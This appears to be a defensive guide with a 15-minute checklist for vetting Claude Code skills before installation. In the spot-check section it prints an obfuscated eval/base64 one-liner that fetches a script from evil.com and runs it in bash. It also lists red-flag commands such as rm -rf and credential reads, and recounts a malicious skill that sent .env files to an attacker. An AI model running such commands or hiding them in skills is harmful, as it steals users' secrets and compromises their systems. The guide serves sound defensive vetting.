# Claude Code Skill Vetting Guide
**How to Safely Evaluate Skills Before Installing (15-Minute Checklist)**

A step-by-step process for non-technical leaders to vet Claude Code skills.

---

## Overview

**Time Required**: 15 minutes per skill
**Difficulty**: Easy (no coding required)
**Output**: GO / NO-GO / ESCALATE decision
**Prerequisites**: Install [skill-scanner.py](../scripts/skill-scanner.py) first

---

## Why It Matters

Claude Code skills are powerful but risky:
- ✅ **Can access all files** in your working directory (and beyond with permissions)
- ✅ **Can execute commands** on your computer
- ✅ **Can make network requests** (upload data to anywhere)

**One malicious skill = Complete compromise**

**Real example**: A "productivity helper" skill looked legitimate (50 GitHub stars, clean README). Hidden in line 247 of SKILL.md: Code that uploaded `.env` files to attacker's server. Discovered after 2,000+ installs.

---

## The 7-Step Vetting Process

Follow these steps **in order**. If any step fails, STOP and reject the skill.

---

### Step 1: Source Check (2 minutes)

**Question**: Where did this skill come from?

#### Trusted Sources (Lower Risk)
✅ **Official Anthropic**: docs.anthropic.com
- Risk: Very Low
- Action: Quick review, then approve

✅ **OpenClaw (verified)**: github.com/cline/openclaw
- Risk: Low-Medium
- Action: Follow steps 2-7

⚠️ **Reputable author with >1,000 GitHub stars**
- Risk: Medium
- Action: Follow all steps 2-7

#### Untrusted Sources (Higher Risk)
⚠️ **Random GitHub repo** (<1,000 stars)
- Risk: Medium-High
- Action: Full vetting required + expert review

❌ **Direct file share** (Discord, Slack, email)
- Risk: Very High
- Action: **Reject unless you personally know and trust the author**

❌ **Anonymous source** (Pastebin, etc.)
- Risk: Extreme
- Action: **Never install**

#### Checklist
- [ ] I know where this skill came from (have URL)
- [ ] Source is on the "Trusted" or "Reputable" list above
- [ ] NOT from Discord/Slack/email/anonymous source

**Decision**:
- ✅ Pass → Continue to Step 2
- ❌ Fail → **REJECT skill**

---

### Step 2: Author Reputation Check (3 minutes)

**Question**: Who created this skill, and can they be trusted?

#### What to Check

**On GitHub** (if skill is from GitHub repo):
1. **Author profile**: Click on username
   - [ ] Real name and photo (not fake-looking)
   - [ ] Account >1 year old (not brand new)
   - [ ] Other repositories (not just this one)
   - [ ] Followers >50 (some community presence)

2. **Repository metrics**:
   - [ ] Stars: >50 (better if >500)
   - [ ] Last commit: Within 6 months
   - [ ] Contributors: >1 person (not solo project)
   - [ ] Issues addressed: Author responds to bug reports

3. **Community signals**:
   - [ ] README is professional (not rushed or poorly written)
   - [ ] Has documentation
   - [ ] License included (MIT, Apache, etc.)

**Red Flags** (any of these = REJECT):
- ❌ Account created <30 days ago
- ❌ Only this one repository
- ❌ No profile info (anonymous)
- ❌ Poor English in README (often sign of quick malware port)
- ❌ No license (unclear legal status)
- ❌ Stars/followers disproportionate to age (fake engagement)

#### Checklist
- [ ] Author has real GitHub profile (>1 year old)
- [ ] Repository has >50 stars OR is from known organization
- [ ] Last updated within 6 months
- [ ] No red flags detected

**Decision**:
- ✅ Pass → Continue to Step 3
- ❌ Fail → **REJECT skill**

---

### Step 3: Size & Complexity Check (2 minutes)

**Question**: Is this skill suspiciously large or complex for what it claims to do?

#### How to Check

**File count**:
```bash
# Count files in skill folder
ls -la ~/.claude/skills/[skill-name]/

# Typical honest skill:
- SKILL.md (1 file, <500 lines)
- Maybe 1-2 helper scripts (if needed)

# Suspicious skill:
- 10+ files
- Multiple nested directories
- Binary files (.exe, .dmg, .bin)
```

**SKILL.md size**:
- ✅ **<1,000 lines**: Normal for most skills
- ⚠️ **1,000-3,000 lines**: Acceptable for complex skills (review carefully)
- ❌ **>3,000 lines**: Suspicious (too complex, may hide malicious code)

**Scripts folder**:
- ✅ **No scripts folder**: Safest (skill is just instructions)
- ⚠️ **1-2 scripts**: Common for utility skills (review scripts)
- ❌ **>3 scripts or nested folders**: Suspicious complexity

**Binary files**:
- ❌ **Any .exe, .dmg, .bin, .app files**: **Immediate rejection**
- ❌ **Compiled code**: Impossible to audit, high risk

#### Checklist
- [ ] SKILL.md is <1,000 lines (or <3,000 with good justification)
- [ ] Scripts folder has ≤2 scripts (or none)
- [ ] No binary or compiled files
- [ ] Complexity matches claimed functionality

**Example**:
- "Summarize text" skill: Should be <200 lines. If it's 2,000 lines, suspicious.
- "Full CI/CD automation" skill: 1,500 lines might be reasonable.

**Decision**:
- ✅ Pass → Continue to Step 4
- ❌ Fail → **REJECT skill**

---

### Step 4: Automated Scan (3 minutes)

**Question**: Does skill-scanner.py flag any issues?

#### How to Use skill-scanner.py

```bash
# Install skill-scanner.py (one-time setup)
# See: scripts/skill-scanner.py in this guide

# Run scanner on skill
python3 scripts/skill-scanner.py ~/.claude/skills/[skill-name]/

# Wait for results (takes 10-30 seconds)
```

#### Interpreting Results

**GREEN (Score: Low Risk)**:
```
✅ No executable scripts found
✅ No network calls detected
✅ No suspicious file operations
✅ No obfuscated code

Risk Score: LOW - Safe to install
```
→ **Continue to Step 5**

**YELLOW (Score: Medium Risk)**:
```
⚠️ Warning: Found 'curl' command in scripts/helper.sh
⚠️ Warning: Skill requests filesystem access

Risk Score: MEDIUM - Manual review recommended
```
→ **Review flagged items. If you understand why they're needed, continue. Otherwise, escalate.**

**RED (Score: High Risk)**:
```
❌ CRITICAL: Found 'rm -rf' in scripts/cleanup.sh
❌ CRITICAL: Found base64 encoding (possible obfuscation)
⚠️ Warning: Found 'eval' command (code injection risk)

Risk Score: HIGH - Do not install without expert review
```
→ **REJECT skill or escalate to security expert**

#### Checklist
- [ ] skill-scanner.py installed and working
- [ ] Scan completed without errors
- [ ] Risk score is LOW or MEDIUM (not HIGH/CRITICAL)
- [ ] Any warnings are understood and justified

**Decision**:
- ✅ Pass (LOW or acceptable MEDIUM) → Continue to Step 5
- ⚠️ Escalate (MEDIUM with concerns) → Get expert review
- ❌ Fail (HIGH/CRITICAL) → **REJECT skill**

---

### Step 5: Permission Review (2 minutes)

**Question**: What permissions does this skill request?

#### How to Check

**Read SKILL.md header** (usually top 20 lines):
```markdown
# Example Skill

**Permissions Required**:
- Read files in current directory
- Execute bash commands
- Network access

```

**Red Flags** (permissions not needed for function):
- ❌ "Full filesystem access" for a text summarizer
- ❌ "Execute commands" for a documentation formatter
- ❌ "Network access" for a local code analyzer

**Principle of Least Privilege**: Skill should only request what it needs.

#### Common Legitimate Permissions

| Skill Type | Legitimate Permissions |
|------------|----------------------|
| **Text summarizer** | Read files in working directory |
| **Code formatter** | Read/write files in working directory |
| **API caller** | Network access + read config |
| **Git helper** | Execute git commands + read repo |
| **File organizer** | Read/write files + execute commands |

#### Checklist
- [ ] Skill documentation clearly states permissions needed
- [ ] Permissions match claimed functionality (no excessive access)
- [ ] You understand why each permission is needed

**If unsure**: Ask yourself, "Why would a [skill function] need [permission]?"

**Decision**:
- ✅ Pass → Continue to Step 6
- ❌ Fail → **REJECT skill**

---

### Step 6: Community Signals (2 minutes)

**Question**: What are others saying about this skill?

#### Where to Look

**GitHub Issues/Discussions**:
- Read 3-5 most recent issues
- Look for security complaints
- Check if author responds to problems

**Google Search**:
```
"[skill name]" security OR malware OR virus OR suspicious
```

**Reddit/Twitter**:
```
site:reddit.com "[skill name]"
site:twitter.com "[skill name]"
```

#### Good Signs
- ✅ Active community discussion
- ✅ Issues are addressed by author
- ✅ Positive reviews from real accounts
- ✅ Used by known organizations

#### Red Flags
- ❌ Security complaints in issues
- ❌ "This stole my data" reports
- ❌ Author deleted negative comments
- ❌ All reviews are 5-star with generic text (fake)
- ❌ No discussion anywhere (brand new, no validation)

#### Checklist
- [ ] Searched for security concerns (found none)
- [ ] Community discussion exists and is positive
- [ ] No reports of malicious behavior
- [ ] OR skill is from official source (Anthropic) so community check less critical

**Decision**:
- ✅ Pass → Continue to Step 7
- ❌ Fail → **REJECT skill**

---

### Step 7: Manual Spot Check (3 minutes)

**Question**: Does anything look suspicious in the actual code?

**Important**: You don't need to be a programmer to spot red flags.

#### How to Do a Spot Check

**Open SKILL.md in text editor**:
```bash
# macOS
open ~/.claude/skills/[skill-name]/SKILL.md

# Or use any text editor
```

**Visually scan for red flag keywords** (Ctrl+F / Cmd+F to search):

**🔴 Immediate Red Flags** (reject if found):
- `rm -rf` (delete files recursively)
- `eval` (execute arbitrary code)
- `base64` (obfuscation technique)
- `curl http://` or `wget http://` to unknown domains
- `/dev/null` in suspicious context (hiding output)
- `chmod +x` on files you don't recognize

**🟡 Yellow Flags** (review carefully):
- `curl` or `wget` (network calls - where to?)
- `npm install` (installing dependencies - what?)
- `git clone` (downloading code - from where?)
- `export` (setting environment variables - why?)
- Accessing `~/.env` or `~/.aws` (reading credentials - justified?)

#### Visual Red Flags

**Obfuscated code** (impossible to read):
```bash
# RED FLAG: What is this doing?
eval $(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vc2NyaXB0IHwgYmFzaA==" | base64 -d)

# vs. Normal readable code:
# Fetch latest version from GitHub
curl https://api.github.com/repos/user/repo/releases/latest
```

**Suspiciously long URLs** (hiding destination):
```bash
# RED FLAG: Where does this go?
curl http://bit.ly/a8d9f2

# vs. Normal transparent URL:
curl https://raw.githubusercontent.com/user/repo/main/script.sh
```

#### Checklist
- [ ] No immediate red flag keywords found
- [ ] Network calls (if any) go to known/documented domains
- [ ] Code is readable (not obfuscated)
- [ ] No suspicious file operations

**If you see something suspicious but don't understand it**: Escalate to expert.

**Decision**:
- ✅ Pass → Approve skill
- ⚠️ Uncertain → Escalate to expert
- ❌ Fail → **REJECT skill**

---

## Final Decision Matrix

| Step | Result | Action |
|------|--------|--------|
| **All steps PASS** | ✅ | **APPROVE** - Install skill with confidence |
| **1-2 steps FAIL** | ❌ | **REJECT** - Do not install |
| **Yellow flags but otherwise OK** | ⚠️ | **ESCALATE** - Get expert review |
| **Uncertain about results** | ⚠️ | **ESCALATE** - Better safe than sorry |

---

## Escalation: When to Get Expert Help

**Escalate if**:
- ⚠️ skill-scanner.py shows MEDIUM risk and you don't understand why
- ⚠️ Permissions seem excessive but you're not sure
- ⚠️ Community reports mixed (some positive, some concerning)
- ⚠️ Code has red flags but skill seems legitimate
- ⚠️ You're just not comfortable approving it

**Who to ask**:
1. **Technical team member** (if you have one)
2. **Security consultant** ($100-200 for 30-min review)
3. **Claude community** (forums, Discord - be careful not to share sensitive context)

**What to send them**:
- GitHub URL or skill folder
- skill-scanner.py output
- Your concerns

---

## Rejection: How to Say No

**If rejecting**:
1. **Document why**: "Rejected [skill name] because [reason]"
2. **Tell requester**: "We can't install this because [security concern]. Here's a safer alternative: [trusted similar tool]"
3. **Add to blocklist**: Keep list of rejected skills (prevents re-requests)

**Common rejection reasons**:
- Unknown author with no reputation
- High risk score from skill-scanner.py
- Excessive permissions for claimed function
- Source not verifiable (Discord share, etc.)
- Abandoned project (not updated in >12 months)

---

## Approval: Safe Installation Process

**If approving**:

1. **Document approval**:
   ```
   Approved: [skill name]
   Date: [YYYY-MM-DD]
   Source: [GitHub URL]
   Approved by: [Your name]
   Scanner score: LOW
   Notes: [Any conditions or monitoring needed]
   ```

2. **Install skill**:
   ```bash
   # Method 1: Clone from GitHub
   git clone [repo-url] ~/.claude/skills/[skill-name]

   # Method 2: Manual download and unzip
   # (if not a git repo)
   ```

3. **Test in safe environment first**:
   - Create test directory (not production code)
   - Try skill on dummy files
   - Verify it works as claimed

4. **Monitor for changes**:
   - If skill is from git repo, note current commit hash
   - Check for updates quarterly
   - Re-scan if skill updates

---

## Quick Reference: Red Flags Cheat Sheet

Print this and keep it handy:

| Red Flag | What It Means | Action |
|----------|---------------|--------|
| **Anonymous author** | No accountability | ❌ Reject |
| **Account <30 days old** | Throwaway account | ❌ Reject |
| **Binary files (.exe, .dmg)** | Can't audit | ❌ Reject |
| **Obfuscated code (base64, eval)** | Hiding behavior | ❌ Reject |
| **rm -rf** | Can delete files | ❌ Reject (unless justified) |
| **curl to unknown domain** | Exfiltration risk | ⚠️ Escalate |
| **>3,000 lines for simple task** | Overcomplicated | ⚠️ Escalate |
| **No updates in >12 months** | Abandoned | ⚠️ Review carefully |
| **All 5-star reviews** | Fake engagement | ⚠️ Suspicious |
| **Excessive permissions** | Violates least privilege | ❌ Reject |

---

## Examples: Real Vetting Decisions

### Example 1: "Helpful Text Summarizer"

**Source**: Random GitHub repo (50 stars)
**Author**: 6-month-old account, 3 other repos
**Size**: SKILL.md is 200 lines, no scripts
**Scanner**: ✅ LOW risk, no warnings
**Permissions**: Read files in working directory
**Community**: No discussion found (too new)
**Spot check**: Clean, readable code

**Decision**: ✅ **APPROVE** (all checks pass)

---

### Example 2: "Amazing Productivity Suite"

**Source**: Discord share (no GitHub link)
**Author**: Unknown (file shared directly)
**Size**: 3,500 lines, 8 script files
**Scanner**: ❌ HIGH risk - found `curl`, `base64`, `eval`
**Permissions**: Not documented
**Community**: N/A (no source to check)
**Spot check**: Obfuscated code in scripts

**Decision**: ❌ **REJECT** (multiple critical failures)

---

### Example 3: "OpenClaw Verified Skill"

**Source**: github.com/cline/openclaw
**Author**: OpenClaw organization (verified)
**Size**: 500 lines, 1 helper script
**Scanner**: ⚠️ MEDIUM risk - found `curl` to GitHub API
**Permissions**: Network access (documented: fetches from GitHub API)
**Community**: Part of OpenClaw collection, vetted
**Spot check**: `curl` goes to `api.github.com` (legitimate)

**Decision**: ✅ **APPROVE** (MEDIUM risk justified, trusted source)

---

### Example 4: "Enterprise Backup Tool"

**Source**: GitHub repo (800 stars)
**Author**: Known security company
**Size**: 2,000 lines, 4 scripts
**Scanner**: ⚠️ MEDIUM risk - found `aws s3 sync`
**Permissions**: AWS credentials access (documented)
**Community**: Active, positive reviews
**Spot check**: Code accesses `~/.aws/credentials`

**Decision**: ⚠️ **ESCALATE** (legitimate company, but accessing credentials is high-risk. Get expert review before approving for company use.)

---

## Time-Saving Tips

**For skills you install frequently**:
1. Create a "pre-approved" list of sources (OpenClaw, specific authors)
2. Fast-track approvals for known-good sources (still run scanner though)
3. Template your approval documentation (fill-in-the-blank)

**For your team**:
1. Train 2-3 people on vetting process (don't bottleneck on you)
2. Share approved skills list (avoid duplicate vetting)
3. Calendar 30-min weekly "skill review session" (batch process)

---

## Quarterly Review Process

**Every 3 months**:
1. Re-run skill-scanner.py on all installed skills
2. Check if skills have been updated (re-review updates)
3. Remove unused skills (reduce attack surface)
4. Update approved/rejected lists

**Checklist**:
- [ ] List all current skills: `ls ~/.claude/skills/`
- [ ] For each, check: Last used? Still needed?
- [ ] Scan each: `python3 skill-scanner.py ~/.claude/skills/*/`
- [ ] Review any new MEDIUM/HIGH risk scores
- [ ] Remove or re-review anything flagged

---

## 🔗 Related Resources

**Before using this guide**:
- [TOOLS.md](../TOOLS.md) - Understand trusted sources
- [THREATS.md](../THREATS.md) - Know what you're protecting against

**After approving a skill**:
- [Data Protection Guide](06-data-protection.md) - Minimize what approved skills can access
- [Incident Response Guide](08-incident-response.md) - What to do if something goes wrong

**For other tool types**:
- [MCP Server Security](03-mcp-servers.md)
- [Browser Extension Security](04-browser-extensions.md)
- [ChatGPT Plugin Security](05-chatgpt-plugins.md)

---

**Last Updated**: February 2026

---

**Remember**: 15 minutes of vetting can prevent $500,000 of damage. Never skip this process, no matter how legitimate a skill looks or who recommended it.
